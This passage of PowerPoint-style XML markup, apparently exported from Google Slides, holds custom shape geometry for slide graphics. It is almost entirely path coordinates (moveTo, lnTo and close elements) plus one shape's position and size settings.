                  <a:lnTo>
                    <a:pt x="15004" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="14197"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="14527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16398" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16801" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17205" y="14527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17571" y="14417"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17902" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18122" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18268" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18305" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18305" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18232" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18122" y="12803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17975" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17792" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17902" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18232" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18599" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18709" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18855" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19002" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19149" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19406" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19662" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19919" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20139" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20359" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20543" y="11776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20653" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20726" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20799" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20763" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20726" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20689" y="10382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20579" y="10272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20359" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20066" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19919" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19626" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19516" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19479" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19185" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18929" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18819" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18672" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18599" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18525" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18452" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18452" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18048" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17645" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17608" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17608" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17241" y="11776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16911" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16838" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16214" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15811" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15664" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15444" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15371" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15334" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15224" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16031" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16361" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16471" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16581" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16581" y="7631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16398" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16251" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16031" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15591" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="631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7" name="Google Shape;307;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6425400" y="3728200"/>
              <a:ext cx="342075" cy="360425"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="13683" h="14417" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="9281" y="2311"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9170" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9060" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9427" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="2311"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8694" y="1615"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8767" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9170" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10674" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8730" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5832" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="1615"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6823" y="6823"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6933" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6749" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="6823"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2714" y="5393"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2641" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2751" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2714" y="5393"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4072" y="4843"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4182" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4328" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5942" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5172" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4695" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2604" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="4843"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8877" y="7740"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8877" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="7740"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2128" y="9721"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2054" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="9721"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5612" y="9281"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5576" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7226" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7226" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="9281"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8730" y="6970"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8804" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10564" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10564" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9170" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="11812"/>
                  </a:lnTo>
